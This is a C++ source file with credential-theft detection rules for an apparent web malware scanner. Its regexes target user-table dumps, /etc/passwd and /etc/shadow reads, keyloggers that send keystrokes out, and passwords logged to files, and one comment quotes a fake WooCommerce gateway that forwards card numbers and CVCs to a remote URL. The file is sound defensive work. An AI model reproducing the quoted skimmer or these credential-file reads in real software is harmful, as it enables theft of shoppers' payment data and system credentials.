#include "credential_theft.h"
#include <algorithm>
#include <array>
#include <cctype>
#include <string>
#include <vector>

namespace lyxbosa::rules::credential_theft {

// CRED001: Database dump
namespace detail_CRED001 {
    static constexpr Pattern patterns[] = {
        { R"(SELECT\s+\*\s+FROM\s+\S*users\S*\s+INTO\s+OUTFILE)",
          "User table export", false,
          {"outfile", "select", "users"} },
    };
}
const BuiltinRule CRED001 {
    .code = {Category::CredTheft, 1},
    .name = "Database credential dump",
    .description = "Detects attempts to export user tables",
    .severity = Severity::Critical,
    .patterns = detail_CRED001::patterns,
};

// CRED002: Password file read
namespace detail_CRED002 {
    static constexpr Pattern patterns[] = {
        { R"((?i:file_get_contents)\s*\(\s*['"]/etc/passwd['"])",
          "passwd file read", false,
          {"file_get_contents", "/etc/passwd"} },
        { R"((?i:file_get_contents)\s*\(\s*['"]/etc/shadow['"])",
          "shadow file read", false,
          {"file_get_contents", "/etc/shadow"} },
    };
}
const BuiltinRule CRED002 {
    .code = {Category::CredTheft, 2},
    .name = "System password file access",
    .description = "Detects attempts to read system password files",
    .severity = Severity::Critical,
    .patterns = detail_CRED002::patterns,
};

// CRED003: FTP credential theft
namespace detail_CRED003 {
    static constexpr Pattern patterns[] = {
        { R"((?i:ftp_login)\s*\([^)]*\$_(GET|POST|REQUEST))",
          "FTP login with user input", false,
          {"ftp_login", "$_get|$_post|$_request"} },
    };
}
const BuiltinRule CRED003 {
    .code = {Category::CredTheft, 3},
    .name = "FTP credential capture",
    .description = "Detects FTP login with user-supplied credentials",
    .severity = Severity::High,
    .patterns = detail_CRED003::patterns,
};

// CRED004: Keylogger injection
// Plain addEventListener('keydown') is very common in legitimate code
// Malicious keyloggers capture keys AND send them to external URL
// Look for keyboard events combined with data exfiltration
namespace detail_CRED004 {
    static constexpr Pattern patterns[] = {
        // Keyboard event + XMLHttpRequest/fetch in close proximity (exfiltration)
        { R"((?i:addEventListener)\s*\(\s*['"]key(down|press|up)['"][^}]*XMLHttpRequest)",
          "Keyboard capture with XHR", false,
          {"addeventlistener", "xmlhttprequest"} },
        // Keyboard event + new Image().src (beacon exfiltration)
        { R"((?i:addEventListener)\s*\(\s*['"]key(down|press|up)['"][^}]*new\s+Image\s*\(\s*\)\.src)",
          "Keyboard capture with image beacon", false,
          {"addeventlistener", "image"} },
        // onkeydown with string accumulation and URL
        { R"(onkey(down|press)\s*=.*\+=.*https?://)",
          "Key accumulation with URL", false,
          {"onkey", "http"} },
    };
}
const BuiltinRule CRED004 {
    .code = {Category::CredTheft, 4},
    .name = "Keylogger with exfiltration",
    .description = "Detects keyboard capture combined with data exfiltration",
    .severity = Severity::High,
    .patterns = detail_CRED004::patterns,
};

// CRED005: Credential logging to file
namespace detail_CRED005 {
    static constexpr Pattern patterns[] = {
        { R"((?i:file_put_contents)\s*\([^,]*,\s*[^)]*\$_(POST|GET|REQUEST)\s*\[\s*['"]pass)",
          "Password logged to file", false,
          {"file_put_contents", "pass"} },
    };
}
const BuiltinRule CRED005 {
    .code = {Category::CredTheft, 5},
    .name = "Credential file logging",
    .description = "Detects passwords being written to files",
    .severity = Severity::Critical,
    .patterns = detail_CRED005::patterns,
};

// CRED006: Suspicious TLD for exfiltration
// Only flag known-abused FREE TLDs used for phishing/malware
// Removed .cn and .ru as they have many legitimate sites (Chinese manufacturers, etc.)
// Note: Using non-capturing group (?:...) so RE2 returns the full URL match
namespace detail_CRED006 {
    static constexpr Pattern patterns[] = {
        // Free TLDs heavily abused for malware/phishing
        { R"(https?://[a-zA-Z0-9.\-]+\.(?:tk|ml|ga|cf|gq)/)",
          "Free TLD URL (abuse-prone)", false,
          {"http"} },
    };
}
const BuiltinRule CRED006 {
    .code = {Category::CredTheft, 6},
    .name = "Suspicious free TLD in URL",
    .description = "Detects URLs with free TLDs commonly abused for phishing",
    .severity = Severity::Medium,
    .patterns = detail_CRED006::patterns,
};

// CRED007: a card security code read from the request and shipped to a remote sink
//
// A fake WooCommerce payment gateway - a plugin directory with a random suffix, a
// convincing settings screen and a checkout form that always fails - carries this:
//
//     public function process_payment($order_id) {
//         $card_number = $_POST['card-number'];
//         $card_expiry = $_POST['card-expiry'];
//         $card_cvc    = $_POST['card-cvc'];
//         $url  = $this->get_option('gateway_url');
//         $data = array('card_number'=>..., 'card_expiry'=>..., 'card_cvc'=>$card_cvc, ...);
//         $data['billing']  = array(...);      // the whole billing record
//         $data['shipping'] = array(...);      // and the shipping one
//         file_get_contents($url . urlencode(json_encode($data)));
//         ...
//     }
//
// THE CVC IS THE DISCRIMINATOR AND THE OTHER CARD FIELDS ARE NOT. A real gateway
// tokenises client-side and PCI DSS forbids retaining the security code at all, so a
// server-side CVC in transit is close to definitionally wrong. A card number or a
// stored token crossing a server is ordinary e-commerce: `woocommerce-paypal-payments`
// reads `$_POST['wc-ppcp-credit-card-gateway-payment-token']` and an EveryPay gateway
// reads `$_POST['tokenized-card']`, both entirely honest, and both would be taken by a
// rule keyed on "card".
//
// WHY THIS IS NARROWER THAN THE CANDIDATE IT CAME FROM, and the one false positive that
// made it so. The measured candidate was three existence tests over one file - a CVC
// token anywhere, a superglobal read anywhere, a remote sink anywhere - and over
// 207,311 files it cost 1 false positive against 465 at risk. That file is a form
// builder's ~46 KB bootstrap, and it fails on the half the candidate could not express:
// its CVC token is an array key in a field-class registration list, its superglobals are
// a page-builder detection several hundred lines further on, and its sinks are a local
// template read and a marketing-feed fetch further on again. Nothing reads a card code
// and nothing carries one anywhere. So the rule requires what the phrase "reaching a
// sink" actually means:
//
//   * the security code must be READ FROM THE REQUEST - the CVC name has to be the
//     subscript key of a `$_POST`/`$_REQUEST`/`$_GET`, not a token that merely occurs;
//   * the sink must be REACHABLE FROM THAT READ - found scanning forward without
//     leaving the enclosing brace block, so a delete somewhere else in a large file
//     does not count.
//
// This was not tuned to the one file after the fact; it is the shape the candidate's
// own review predicted it would need. It is also a strict narrowing of the measured
// predicate, so that measurement still bounds this one: 0 of the same 465 at-risk
// files, 95% upper bound 0.65%. Separately, and this is the stronger statement,
// 0 of the 207,311 read a card security code out of a superglobal at all - the
// excluded file is not a near miss on one condition, it is two conditions away.
//
// The forward-scan brace count does not understand strings or heredocs. That can only
// end a block early - a lost detection, never an invented one - except for a stray `{`
// inside a literal, which is why the walk is also capped. The cap is a cost bound and
// not the discriminator: the sample's read and sink are 1,537 bytes and zero braces
// apart, and its OTHER CVC read, inside the validate-fields method, is correctly not
// reported because that method closes before any sink.
namespace detail_CRED007 {
    constexpr size_t kMaxBlockBytes = 8192;   // cost bound on one block's forward walk
    constexpr size_t kMaxFindings = 4;

    inline bool isIdentByte(unsigned char c) {
        return std::isalnum(c) != 0 || c == '_';
    }

    inline bool isSpace(char c) {
        return c == ' ' || c == '\t' || c == '\n' || c == '\r';
    }

    inline char lower(char c) {
        return (c >= 'A' && c <= 'Z') ? static_cast<char>(c - 'A' + 'a') : c;
    }

    // Whether a subscript key names a card security code, using the same token set the
    // false-positive measurement was taken with: `card` + optional separator + `cvc`,
    // a word-bounded `cvv`/`cvv2`, or `security` + optional separator + `code`.
    //
    // A bare `cvc` with nothing in front of it is deliberately NOT in the set. Keeping
    // to the measured tokens is what lets that measurement bound this rule.
    bool namesSecurityCode(std::string_view key) {
        std::string k;
        k.reserve(key.size());
        for (char c : key) k.push_back(lower(c));

        auto joined = [&](std::string_view head, std::string_view tail) {
            for (size_t i = 0; i + head.size() <= k.size(); ++i) {
                if (k.compare(i, head.size(), head) != 0) continue;
                size_t j = i + head.size();
                if (j < k.size() && (k[j] == '_' || k[j] == '-')) ++j;
                if (j + tail.size() <= k.size() && k.compare(j, tail.size(), tail) == 0) return true;
            }
            return false;
        };
        if (joined("card", "cvc") || joined("card", "cvv")) return true;
        if (joined("security", "code")) return true;

        // Word-bounded cvv / cvv2.
        for (size_t i = 0; i + 3 <= k.size(); ++i) {
            if (k.compare(i, 3, "cvv") != 0) continue;
            if (i > 0 && isIdentByte(static_cast<unsigned char>(k[i - 1]))) continue;
            size_t j = i + 3;
            if (j < k.size() && k[j] == '2') ++j;
            if (j >= k.size() || !isIdentByte(static_cast<unsigned char>(k[j]))) return true;
        }
        return false;
    }

    // A remote-fetch sink at `i`, whole word.
    bool sinkAt(std::string_view c, size_t i) {
        static constexpr std::string_view kSinks[] = {
            "file_get_contents", "curl_exec", "curl_setopt", "fsockopen",
            "wp_remote_get", "wp_remote_post",
        };
        if (i > 0 && isIdentByte(static_cast<unsigned char>(c[i - 1]))) return false;
        for (auto sink : kSinks) {
            if (i + sink.size() <= c.size() && c.compare(i, sink.size(), sink) == 0) {
                const size_t after = i + sink.size();
                if (after >= c.size() || !isIdentByte(static_cast<unsigned char>(c[after]))) {
                    return true;
                }
            }
        }
        return false;
    }

    // Forward from `from` to the end of the enclosing brace block, capped. Returns the
    // offset of the first sink found there, or npos.
    size_t sinkInSameBlock(std::string_view c, size_t from) {
        const size_t stop = std::min(c.size(), from + kMaxBlockBytes);
        size_t depth = 0;
        for (size_t i = from; i < stop; ++i) {
            const char ch = c[i];
            if (ch == '{') { ++depth; continue; }
            if (ch == '}') {
                if (depth == 0) return std::string_view::npos;   // left the block
                --depth;
                continue;
            }
            if (sinkAt(c, i)) return i;
        }
        return std::string_view::npos;
    }

    std::vector<MatchResult> detectCardCodeToRemoteSink(std::string_view content) {
        std::vector<MatchResult> out;
        // Cheap guards first: this analyzer has no literal gate, so it runs on every
        // file in the tree. A match needs a superglobal subscript and a sink, and the
        // shortest piece every sink name shares is nothing - so gate on the read.
        if (content.find("$_") == std::string_view::npos) return out;

        for (size_t at = content.find("$_"); at != std::string_view::npos;
             at = content.find("$_", at + 1)) {
            size_t j = at + 2;
            std::string name;
            while (j < content.size() && isIdentByte(static_cast<unsigned char>(content[j]))) {
                name.push_back(lower(content[j]));
                ++j;
            }
            if (name != "post" && name != "request" && name != "get") continue;

            while (j < content.size() && isSpace(content[j])) ++j;
            if (j >= content.size() || content[j] != '[') continue;
            ++j;
            while (j < content.size() && isSpace(content[j])) ++j;
            if (j >= content.size() || (content[j] != '\'' && content[j] != '"')) continue;
            const char quote = content[j];
            const size_t keyStart = ++j;
            while (j < content.size() && content[j] != quote) ++j;
            if (j >= content.size()) continue;
            const std::string_view key = content.substr(keyStart, j - keyStart);
            if (!namesSecurityCode(key)) continue;

            const size_t sink = sinkInSameBlock(content, j);
            if (sink == std::string_view::npos) continue;

            auto [line, col] = positionToLineCol(content, at);
            auto [sinkLine, sinkCol] = positionToLineCol(content, sink);
            (void)sinkCol;
            size_t nameEnd = sink;
            while (nameEnd < content.size() &&
                   isIdentByte(static_cast<unsigned char>(content[nameEnd]))) ++nameEnd;
            MatchResult r;
            r.line = line;
            r.column = col;
            r.matched = content.substr(at, std::min<size_t>(j + 1 - at, 64));
            r.note = "The card security code field \"" + std::string(key) +
                     "\" is read out of the request and " +
                     std::string(content.substr(sink, nameEnd - sink)) +
                     "() is reached from that read without leaving the block, at line " +
                     std::to_string(sinkLine) +
                     " - a security code is the one card field no gateway is allowed to "
                     "retain, let alone forward";
            out.push_back(r);
            if (out.size() >= kMaxFindings) return out;
        }
        return out;
    }
}
const BuiltinRule CRED007 {
    .code = {Category::CredTheft, 7},
    .name = "Card security code to a remote sink",
    .description = "Detects a card security code read from a request superglobal and reaching a remote-fetch sink in the same block",
    .severity = Severity::Critical,
    .patterns = {},
    .analyzer = &detail_CRED007::detectCardCodeToRemoteSink,
};

static const std::array<const BuiltinRule*, RULE_COUNT> ALL_RULES = {
    &CRED001, &CRED002, &CRED003, &CRED004, &CRED005, &CRED006, &CRED007
};

const BuiltinRule* const* getAllRules() {
    return ALL_RULES.data();
}

} // namespace lyxbosa::rules::credential_theft
